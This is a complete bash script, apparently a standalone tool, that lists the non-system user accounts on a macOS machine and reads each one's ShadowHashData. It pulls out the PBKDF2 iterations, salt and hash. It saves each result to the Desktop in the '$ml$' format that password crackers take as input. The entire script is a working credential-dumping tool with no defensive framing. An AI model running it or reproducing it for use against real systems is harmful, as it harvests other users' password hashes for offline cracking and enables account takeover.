#!/bin/bash

# This script attempts to extract password hashes for all users on macOS
# Output files are saved to the current user's Desktop

# Get current user and desktop path
CURRENT_USER=$(whoami)
DESKTOP_PATH="/Users/$CURRENT_USER/Desktop"

# Output directory
OUTPUT_DIR="$DESKTOP_PATH/user_hashes_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "MacOS User Hash Extractor"
echo "Output directory: $OUTPUT_DIR"
echo ""

# Get list of all users (excluding system users)
USERS=$(dscl . -list /Users | grep -vE '^_|daemon|nobody|root|Guest')

extract_user_hash() {
    local USER=$1
    local USER_OUTPUT_DIR="$OUTPUT_DIR/$USER"
    mkdir -p "$USER_OUTPUT_DIR"
    
    local HASH_OUTPUT="$USER_OUTPUT_DIR/hash.txt"
    local PLIST_OUTPUT="$USER_OUTPUT_DIR/shadow.plist"
    
    echo "Processing user: $USER"
    
    # Try to extract plist data
    PLIST_DATA=$(dscl . -read "/Users/$USER" dsAttrTypeNative:ShadowHashData 2>/dev/null)
    
    if [ -z "$PLIST_DATA" ]; then
        echo "  Could not retrieve password data for user $USER"
        echo "  (This typically requires root access for other users)"
        return 1
    fi
    
    # Save raw plist data
    echo "$PLIST_DATA" > "$PLIST_OUTPUT"
    
    # Convert to XML format
    cat "$PLIST_OUTPUT" | tail -n 1 | xxd -p -r | plutil -convert xml1 - -o "$PLIST_OUTPUT" 2>/dev/null
    
    if [ $? -ne 0 ]; then
        echo "  Failed to convert plist data for $USER"
        return 1
    fi

    # Extract hash components
    INTEGER_VALUE=$(xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="iterations"]/following-sibling::integer[1]/text()' "$PLIST_OUTPUT" 2>/dev/null)
    
    HASH_SECOND_DATA_BLOCK=$(xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="salt"]/following-sibling::data[1]/text()' "$PLIST_OUTPUT" 2>/dev/null | 
                            awk '{$1=$1};1' | tr -d '\n' | base64 -d | xxd -p -c 256)
    
    HASH_FIRST_DATA_BLOCK=$(xmllint --xpath '//key[text()="SALTED-SHA512-PBKDF2"]/following-sibling::dict[1]/key[text()="entropy"]/following-sibling::data[1]/text()' "$PLIST_OUTPUT" 2>/dev/null | 
                           base64 -d | xxd -p -c 256)

    # Verify we got all components
    if [ -z "$INTEGER_VALUE" ] || [ -z "$HASH_SECOND_DATA_BLOCK" ] || [ -z "$HASH_FIRST_DATA_BLOCK" ]; then
        echo "  Failed to extract all hash components for $USER"
        return 1
    fi

    # Format the hash
    USER_HASH="\$ml\$$INTEGER_VALUE\$$HASH_SECOND_DATA_BLOCK\$$HASH_FIRST_DATA_BLOCK"
    
    # Save to file
    echo "$USER_HASH" > "$HASH_OUTPUT"
    
    echo "  Successfully extracted hash for $USER"
    echo "  Hash saved to: $HASH_OUTPUT"
    echo "  Plist saved to: $PLIST_OUTPUT"
    echo ""
}

# Process all users
for USER in $USERS; do
    extract_user_hash "$USER"
done

echo "Processing complete. Results saved to: $OUTPUT_DIR"
